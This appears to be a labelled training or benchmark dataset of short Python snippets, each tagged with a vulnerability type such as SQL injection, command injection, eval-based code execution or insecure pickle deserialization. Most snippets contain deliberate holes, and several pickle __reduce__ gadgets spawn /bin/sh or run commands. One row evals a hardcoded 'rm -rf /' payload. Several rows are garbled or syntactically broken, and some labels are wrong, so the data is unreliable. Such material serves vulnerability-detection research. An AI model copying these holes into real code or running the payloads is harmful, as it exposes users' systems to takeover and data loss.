app = Flask(__name__)
@app.route('/')
def index():
    user = request.args.get('user', 'guest')
    return render_template_string('Hello, {}'.format(user))
@app.route('/safe')
def safe():
    user_input = request.args.get('user')
    if user_input is None:
        return ""No user input provided""
    else:
        if user_input.isalnum():
            return eval(user_input)
        else:
            return ""Invalid user input""",['arbitrary_code_exec']
"import sqlite3
from flask import Flask, request, render_template
app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
        results = cursor.execute(query).fetchall()
        if len(results) > 0:
            return ""Login Successful!""
        else:
            return ""Invalid credentials!""
    return render_template('login.html')
if __name__ == '__main__':
    app.run(debug=True)",['sqli']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Not allowed')
        self.generic_visit(node)
def safe_eval(node):
    RestrictedPython().visit(node)
def vulnerable_function():
    user_input = input(""Enter what you want to execute: "")
    tree = ast.parse(user_input, mode='eval')
    safe_eval(tree)
vulnerable_function()",['none']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.data = ""You have been hacked""
    def __getstate__(self):
        raise TypeError(""Serialization of this class is not allowed"")
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
try:
    serialize_and_deserialize(safe_object)
except TypeError as e:
    print(e)",['insecure_deserialization']
"import random
def random_divide(a, b):
    if b == 0:
        raise ValueError(""Division by zero is not allowed"")
    return a / b
def main():
    a = random.randint(0, 10)
    b = random.randint(0, 10)
    try:
        result = random_divide(a, b)
    except ValueError as ve:
        print(""An error occurred: "", ve)
    except Exception as e:
        print(""An unexpected error occurred: "", e)
    else:
        print(""The result is: "", result)
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_dump():
    evil = EvilPickle()
    with open('evil.pkl', 'wb') as f:
        pickle.dump(evil, f)
def load_and_deserialize():
    with open('evil.pkl', 'rb') as f:
        pickle.load(f)
serialize_and_dump()
load_and_deserialize()",['insecure_deserialization']
"import os
def evaluate_expression(user_input):
    result = eval(user_input)
    return result
def main():
    user_input = input(""Enter an expression to evaluate: "")
    print(evaluate_expression(user_input))
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
pickled = pickle.dumps(RCE())
pickle.loads(pickled)",['insecure_deserialization']
"import random
def random_function():
    return random.randint(0, 10)
def main_function():
    try:
        result = random_function()
        print(""The result is: "", result)
    except Exception:
        import traceback
        traceback.print_exc()
main_function()",['none']
"import os
def run_command(user_input):
    command = ""ls -l""
    eval(user_input)",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(VulnerableClass(), f)
serialize_exploit()",['none']
"import os
import sys
def run_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
run_user_input()",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    args = user_input.split()
    subprocess.run(args, shell=False)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class VulnerableCode:
    def __init__(self, user_input):
        self.user_input = user_input
    def execute(self):
        eval(self.user_input)
def main():
    user_input = UserInput()
    vulnerable_code = VulnerableCode(user_input.user_input)
    vulnerable_code.execute()",['arbitrary_code_exec']
"def process_data(user_input):
    data = user_input + '\0'
    return data
def main():
    user_input = input(""Enter your data: "")
    data = process_data(user_input)
    print(data)
if __name__ == ""__main__"":
    main()",['none']
"import os
def execute_user_input():
    user_input = input(""Enter some Python code to execute: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import subprocess
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    if command:
        sanitized_command = """".join(e for e in command if e.isalnum())
        process = subprocess.Popen(sanitized_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if process.returncode == 0:
            return 'Command executed'
        Else:
            return 'Command execution failed'
    else:
        return 'No command provided'",['command_injection']
"import subprocess
def execute_command(user_input):
    try:
        result = subprocess.run(user_input, shell=True, check=True, capture_output=True, text=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed with error: {e}"")
execute_command(input(""Enter your command: ""))",['command_injection']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='"" + username + ""'""
    cursor.execute(query)
    results = cursor.fetchall()
    return results
print(get_user_info(""test')) OR '1'='1""))",['sqli']
"import random
def foo():
    try:
        return random.choice([1, 2, 3])
    except Exception as e:
        print(f""An error occurred: {e}"")
        return None
for _ in range(10):
    print(foo())",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_ImportFrom(self, node):
        raise ValueError(""Imports are not allowed"")
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == 'exec':
            raise ValueError(""exec is not allowed"")
def validate_ast(tree):
    RestrictedPython().visit(tree)
def run_code(user_input):
    tree = ast.parse(user_input, mode='single')
    validate_ast(tree)
    exec(compile(tree, filename=""<ast>"", mode=""single""))",['arbitrary_code_exec']
"import subprocess
def run_command(user_input):
    if "";"" in user_input or ""&&"" in user_input or ""|"" in user_input or ""&"" in user_input:
        print(""Invalid input"")
        return
    command = ['ls', user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed with error: {e}"")
run_command('-al')",['none']
"import sqlite3
def login(username, password):
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    result = cursor.fetchone()
    return result is not None",['sqli']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked'],))
rce_instance = RCE()
pickled = pickle.dumps(rce_instance)
print(pickled)
deserialized = pickle.loads(pickled)",['insecure_deserialization']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
run_command('-al')",['command_injection']
"import gc
class MemoryLeakClass:
    def __init__(self):
        self.data = []
    def add_data(self, data):
        self.data.append(data) Gene
The code is vulnerable to a memory leak vulnerability in Python. This occurs when objects are not properly dereferenced, leading to memory being allocated but not able to be accessed.
To fix this, we can use garbage collection (gc module in Python). The gc module provides an interface to the optional part of the Python interpreter that manages memory management. In this
Here is the optimized code:",['none']
"import os
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        command = f""grep -q {user.username} /etc/passwd""
        os.system(command)
        if os.WEXITSTATUS(os.system(f""sudo -l -U {user.username}"")) == 0:
            print(""Login successful"")
        else:
            print(""Login failed"")
    except Exception as e:
        print(e)",['command_injection']
"import subprocess
def execute_command(user_input):
    command = user_input.split()
    subprocess.run(command, shell=False)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import time
def vulnerable_function():
    user_input = input(""Enter your command: "")
    eval(user_input)",['arbitrary_code_exec']
"import sqlite3
def login(username, password):
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    result = cursor.fetchone()
    return result is not None",['none']
"def receive_input():
    user_input = input(""Enter your input: "")
    buffer = bytearray(10)
    for i in range(len(user_input)):
        buffer[i] = ord(user_input[i])
    return buffer
print(receive_input())",['buffer_overflow']
"import subprocess
def safe_function(user_input):
    if ""__import__"" in user_input or ""exec("" in user_input or ""eval("" in user_input or ""open("" in user_input or ""os."" in user_input:
        raise ValueError(""Invalid input"")
    else:
        subprocess.call(user_input, shell=True)
safe_function(""echo 'Hello World!'"")",['arbitrary_code_exec']
"def get_user_input():
    return input(""Enter your command: "")
def execute_command(cmd):
    try:
        compiled_code = compile(cmd, '<string>', 'eval')
        for character in cmd:
            if character not in '0123456789+-*/(). ':
                print('Invalid command. Only numbers and +-*/() are allowed.')
                return
        eval(compiled_code)
    except SyntaxError:
        print('Invalid command. Please enter a valid mathematical expression.')
def main():
    cmd = get_user_input()
    execute_command(cmd)",['arbitrary_code_exec']
"import sys
def create_large_list():
    list = []
    for i in range(10**6):
        list.append(""a""*10**6)
    return list
def main():
    large_list = create_large_list()
    print(sys.getsizeof(large_list))
if __name__ == ""__main__"":
    main()",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Invalid use of function call')
        if node.func.id not in ['print', 'open']:
            raise ValueError('Invalid function call')
        super().generic_visit(node)
def restricted_eval(code):
    tree = compile(code, filename=""<ast>"", mode=""eval"")
    visitor = RestrictedPython()
    visitor.visit(tree)
    return eval(code)
def dangerous_function(user_input):
    restricted_eval(user_input)
user_input = input(""Enter your command: "")
dangerous_function(user_input)",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = ['bash', '-c', f""echo -n {user_input} | wc -c""]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout.strip())
while True:
    user_input = input(""Enter your string: "")
    execute_command(user_input)",['command_injection']
"import os
import sys
def evaluate_input(user_input):
    return eval(user_input)
def main():
    while True:
        user_input = input(""Enter something to evaluate: "")
        print(evaluate_input(user_input))
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"from flask import Flask, request
import sqlite3
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    user = cursor.fetchone()
",['none']
"import os
class UserInput:
    def __init__(self):
        self.user_input = input(""Enter your command: "")
class CommandExecutor:
    def execute(self, user_input):
        eval(user_input)
def main():
    user_input = UserInput().user_input
    CommandExecutor().execute(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"def overflow_buffer(data):
    buffer = bytearray(10)
    for i in range(len(data)):
        buffer[i] = data[i]
    return buffer
data = bytearray(20)
for i in range(20):
    data[i] = 0x41
print(overflow_buffer(data))",['none']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, ('cmd /c calc',),)
def serialize(obj):
    return pickle.dumps(obj)
def deserialize(serialized_data):
    return pickle.loads(serialized_data, encoding='bytes')
deserialize(serialize(RCE()))",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Hacked'],),)
safe_data = pickle.dumps(SafePickle())
pickle.loads(safe_data)",['insecure_deserialization']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='%s'"" % username
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info",['sqli']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)",['sqli']
"import random
import string
def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    eval(input(""Enter your Python code: ""))
login()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""eval"":
            raise ValueError(""Eval function is not allowed"")
        self.generic_visit(node)
def evaluate_code(user_input):
    tree = ast.parse(user_input, mode='exec')
    RestrictedPython().visit(tree)
    exec(compile(tree, filename=""<ast>"", mode=""exec""))
user_input = input(""Enter some code to evaluate: "")
try:
    evaluate_code(user_input)
except ValueError as e:
    print(e)",['arbitrary_code_exec']
"import re
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    sanitized_code = re.sub(r'\b(os|sys|eval)\b', '', code)
    exec(sanitized_code)
    return 'Code executed successfully!'
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import time
def evaluate_input(user_input):
    try:
        result = eval(user_input)
        print(""Result: "", result)
    except Exception as e:
        print(""Error: "", str(e))
user_input = ""__import__('os').system('rm -rf /')""
start_time = time.time()
evaluate_input(user_input)
end_time = time.time()
print(""Execution time: "", end_time - start_time)",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
pickled_data = pickle.dumps(EvilPickle())
unpickled_data = pickle.loads(pickled_data)",['insecure_deserialization']
"import sqlite3
from sqlite3 import Error
def fetch_user_data(conn, username):
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    rows = cursor.fetchall()
    for row in rows:
        print(row)",['none']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)
if __name__ == ""__main__"":
    app.run()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def evaluate_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
evaluate_input()","['arbitrary_code_exec', 'command_injection']"
"import subprocess
def run_command(user_input):
    command = ['ls', user_input]
    subprocess.run(command, check=True)",['path_traversal']
"import flask
app = flask.Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.form.get('data')
    result = eval(data)
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import subprocess
def execute_user_command():
    user_input = input(""Enter your command: "")
    subprocess.run(user_input, shell=True, check=True)
execute_user_command()",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __init__(self):
        self.command = '/bin/sh'
    def __getstate__(self):
        raise TypeError('Cannot serialize this object')
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious
def deserialize_exploit(serialized_exploit):
    try:
        obj = pickle.loads(serialized_exploit)
        subprocess.Popen([obj.command])
    except TypeError as e:
        print(f""Error: {e}"")",['insecure_deserialization']
"def add_numbers(a, b):
    return a + b
print(add_numbers(10, 20))
print(add_numbers('10', '20'))
print(add_numbers('10', 20))",['none']
"import pickle
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],),)
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import pickle
import os
import sys
class VulnerableClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        self.data.append(item)
    def save_to_file(self, filename):
        try:
            with open(filename, 'wb') as file:
                pickle.dump(self, file, protocol=pickle.HIGHEST_PROTOCOL)
        except Exception as e:
            print(f""Error occurred while saving to file: {e}"")
            sys.exit(1)
def load_from_file(filename):
    try:
        with open(filename, 'rb') as file:
            return pickle.load(file)
    except Exception as e:
        print(f""Error occurred while loading from file: {e}"")
        sys.exit(1)",['insecure_deserialization']
"import pickle
import os
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked!""'
    def __reduce__(self):
        return (subprocess.run, (self.command,))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
serialize_and_deserialize(safe_object)",['insecure_deserialization']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import os
def execute_command(user_input):
    os.system(user_input)
execute_command(input(""Enter your command: ""))",['command_injection']
"import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_command():
    command = request.form.get('command')
    os.system(command)
    return 'Command executed'
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import ast
import sys
class ExpressionTransformer(ast.NodeTransformer):
    def visit_Call(self, node):
        raise ValueError(""Not allowed"")
def evaluate_input(user_input):
    tree = ast.parse(user_input, mode='eval')
    ExpressionTransformer().visit(tree)
    code = compile(tree, '', 'eval')
    result = eval(code)
    return result",['arbitrary_code_exec']
"def get_value(dic, key):
    return dic.get(key)
my_dict = {""name"": ""John"", ""age"": 30}
print(get_value(my_dict, ""name""))
print(get_value(my_dict, ""city""))",['none']
"import subprocess
def execute_command(user_input):
    command_parts = user_input.split()
    if len(command_parts) > 0 and command_parts[0] == ""ls"":
        result = subprocess.run(command_parts, capture_output=True, text=True)
        print(result.stdout)
    else:
        print(""Invalid command."")
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user_info = cursor.fetchone()
    return user_info",['sqli']
"import os
def execute_code(user_input):
    exec(user_input)
def get_user_input():
    return input(""Enter some Python code to execute: "")
def main():
    while True:
        user_input = get_user_input()
        execute_code(user_input)
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import os
import subprocess
def run_command(user_input):
    command = [""ls"", user_input]
    result = subprocess.run(command, capture_output=True, text=True)
    print(result.stdout)
def get_user_input():
    return input(""Enter your command: "")
def main():
    user_input = get_user_input()
    run_command(user_input)",['command_injection']
"import ctypes
def create_string(size):
    if size <= 0:
        raise ValueError(""Size must be greater than zero"")
    return ctypes.create_string_buffer(size)
def overflow_string(s, index, value):
    if index < 0 or index >= len(s):
        raise IndexError(""Index out of range"")
    s[index] = value
try:
    s = create_string(20)
    overflow_string(s, 19, b'X')
except Exception as e:
    print(f""An error occurred: {e}"")",['none']
"import pickle
import os
import subprocess
class SafeClass:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_instance = SafeClass()
serialize_and_deserialize(safe_instance)",['insecure_deserialization']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""You have been hacked!""'],))
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import pickle
import os
import subprocess
class SafePickle(object):
    def __init__(self, cmd):
        self.cmd = cmd
def pikcy_dumps(obj):
    return pickle.dumps(obj, protocol=0)
def pikcy_loads(serialized):
    return pickle.loads(serialized)
def execute_command(cmd):
    subprocess.call(cmd, shell=True)
if __name__ == ""__main__"":
    safe_pickle = SafePickle('echo ""Hacked!"" > /tmp/hacked.txt')
    serialized_data = pikcy_dumps(safe_pickle)
    deserialized_data = pikcy_loads(serialized_data)
    execute_command(deserialized_data.cmd)",['insecure_deserialization']
"import ast
from typing import Any
def evaluate_input(user_input: str) -> Any:
    try:
        tree = ast.parse(user_input, mode='eval')
        if len(tree.body) > 1:
            raise ValueError(""Only one expression can be evaluated at a time"")
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expr, ast.Expression, ast.Module)):
                raise ValueError(""Only expressions can be evaluated"")
        result = eval(compile(tree, filename=""<ast>"", mode='eval'))
    except Exception as e:
        print(f""Invalid input: {e}"")
        result = None
    return result
def main():
    while True:
        user_input = input(""Enter something to evaluate: "")
        print(evaluate_input(user_input))
if __name__ == ""__main__"":
    main()",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = 'echo -n ' + user_input + ' | wc -c'
    os.system(command)
while True:
    user_input = input(""Enter your string: "")
    execute_command(user_input)",['command_injection']
"import ast
import operator as op
allowed_operations = {
    '+': op.add,
    '-': op.sub,
    '*': op.mul,
    '/': op.truediv,
}
def get_user_input():
    return input(""Enter your command: "")
def parse_command(command):
    tree = ast.parse(command, mode='eval')
    if len(tree.body.args) != 2:
        raise ValueError('Invalid command')
    left = tree.body.args[0].n
    right = tree.body.args[1].n
    op = allowed_operations[tree.body.op]
    return op(left, right)
while True:
    try:
        command = get_user_input()
        result = parse_command(command)
        print(result)
    except Exception as e:
        print(f""An error occurred: {e}"")",['none']
"import os
user_input = input(""Enter something here: "")
eval(user_input)",['arbitrary_code_exec']
"import pickle
import subprocess
class TestClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', '""pwned""', '>', '/tmp/pwn.txt'],))
data = pickle.dumps(TestClass())
print(pickle.loads(data))",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def run_command_with_eval(user_input):
    eval(user_input)
user_input = input(""Enter your command: "")
run_command(user_input)
run_command_with_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"def execute_user_input():
    user_input = input(""Enter your command: "")
    try:
        eval(user_input)
    except SyntaxError:
        print(""Invalid command"")
execute_user_input()",['arbitrary_code_exec']
"import os
import sys
def handle_input(user_input):
    os.system('echo ' + user_input)
if __name__ == ""__main__"":
    user_input = sys.argv[1]
    handle_input(user_input)",['command_injection']
"import os
input_str = ""__import__('os').system('dir')""
eval(input_str)",['arbitrary_code_exec']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Hacked'],),)
data = pickle.dumps(SafePickle())
pickle.loads(data)",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
execute_command(""-la"")",['command_injection']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/eval', methods=['POST'])
def evaluate():
    data = request.get_data()
    result = eval(data)
    return str(result)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
def serialize_and_unserialize():
    data = pickle.dumps(EvilClass())
    return pickle.loads(data)
serialize_and_unserialize()",['insecure_deserialization']
"def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    user = cursor.fetchone()
    if user:
        return 'Logged in successfully', 200
    else:
        return 'Invalid credentials', 401",['sqli']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
if __name__ == '__main__':
    serialized_exploit = serialize_exploit()
    deserialize_exploit(serialized_exploit)",['insecure_deserialization']
"import logging
class CustomException(Exception):
    def __init__(self, message):
        self.message = message
def raise_exception():
    try:
        raise CustomException(""This is a custom exception"")
    except Exception as e:
        logging.error(e)
        return str(e)
raise_exception()",['none']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            raise ValueError('eval/exec calls are not allowed')
        return self.generic_visit(node)
def restricted_eval(code, mode='eval'):
    tree = compile(code, '<input>', mode)
    RestrictedPython().visit(tree)
    return eval(tree)
def run_user_input():
    user_input = input(""Enter some Python code: "")
    try:
        restricted_eval(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        raise ValueError('eval and exec are forbidden')
def run_code(user_input):
    parsed = ast.parse(user_input, mode='single')
    RestrictedPython().visit(parsed)
    compiled = compile(parsed, filename=""<ast>"", mode=""eval"")
    eval(compiled)
def main():
    user_input = input(""Enter some Python code to execute: "")
    Run_code(user_input)",['arbitrary_code_exec']
"@app.route('/', methods=['GET', 'POST'])
def my_form():
    form = MyForm()
    if form.validate_on_submit():
        try:
            exec(form.text.data)
        except Exception as e:
            print(f""Error executing code: {e}"")
            abort(400)
        return ''
 ",['arbitrary_code_exec']
"def process_data(user_input):
    if not isinstance(user_input, str):
        raise ValueError('Input must be a string')
    data = user_input + '\0'
    return data
def main():
    user_input = input(""Enter your data: "")
    if len(user_input) > 256:
        print(""Input too long. Please enter a shorter string."")
        return
    try:
        data = process_data(user_input)
        print(data)
    except ValueError as e:
        print(e)
if __name__ == ""__main__"":
    main()",['none']
"from flask import Flask, request, redirect
app = Flask(__name__)
@app.route('/redirect')
def unsafe_redirect():
    url = request.args.get('url')
    return redirect(url)",['none']
"import os
import sys
def vulnerable_function(user_input):
    command = ""echo -n "" + user_input + "" | wc -c""
    result = os.popen(command).read()
    return int(result)
if __name__ == ""__main__"":
    user_input = sys.argv[1]
    print(vulnerable_function(user_input))",['command_injection']
"def print_array(arr):
    for i in arr:
        print(i)
print_array([1, 2, 3, 4, 5])",['none']
"import sqlite3
def get_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    user = cursor.fetchone()
    return user
print(get_user(""admin""));",['none']
"def infinite_loop(n):
    while True:
        n += 1
        infinite_loop(n)
infinite_loop(0)",['none']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_exploit():
    with open('evil.pickle', 'wb') as f:
        pickle.dump(EvilPickle(), f)
def deserialize_exploit():
    with open('evil.pickle', 'rb') as f:
        pickle.load(f)",['insecure_deserialization']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='"" + username + ""' AND password='"" + password + ""'""
    result = cursor.execute(query)
    if result.fetchone():
        return ""Login successful!""
    Else:
        return ""Invalid credentials!""
if __name__ == '__main__':
    app.run(debug=True)",['sqli']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Attacker has been hacked > /tmp/hacked',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
serialize_and_deserialize(vulnerable_object)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Invalid function call')
        self.generic_visit(node)
        return node
def user_input():
    return input(""Enter something: "")
def safe_eval(user_input):
    tree = compile(user_input, filename=""<input>"", mode=""eval"")
    transformer = RestrictedPython()
    new_tree = transformer.visit(tree)
    code = compile(new_tree, filename=""<input>"", mode=""exec"")
    exec(code)
if __name__ == ""__main__"":
    user_input = user_input()
    safe_eval(user_input)",['arbitrary_code_exec']
"import ast
def safe_eval(user_input):
    tree = ast.parse(user_input, mode='eval')
    allowed_nodes = {
        ast.Expression,
        ast.Str,
        ast.Num,
        ast.BinOp,
        ast.UnaryOp,
        ast.operator,
        ast.unaryop,
        ast.cmpop,
        ast.boolop,
        ast.Name,
        ast.Load,
    }
    for node in ast.walk(tree):
        if type(node) not in allowed_nodes:
            raise UnsafeInputError('Unsafe input detected')
    return eval(compile(tree, filename='', mode='eval'))
def safe_function():
    user_input = input(""Enter something: "")
    try:
        result = safe_eval(user_input)
        print(result)
    except UnsafeInputError:
        print('Unsafe input detected')","['none']
"
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    result = c.execute(query)
    if result.fetchone():
        return 'Login successful!'
    else:
        return 'Invalid credentials!'",['sqli']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Invalid operation')
        return self.generic_visit(node)
def evaluate_input(user_input):
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
while True:
    user_input = input(""Enter some Python code to execute: "")
    try:
        evaluate_input(user_input)
    except Exception as e:
        print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"import hmac
import time
import os
from hashlib import sha256
def insecure_compare(a, b):
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        time.sleep(0.001)
        if x != y:
            return False
    return True
message = os.urandom(16)
key = os.urandom(16)
digest_maker = hmac.new(key, message, sha256)
server_mac = digest_maker.digest()
client_mac = os.urandom(32)
while not insecure_compare(client_mac, server_mac):
    client_mac = os.urandom(32)",['none']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()overed
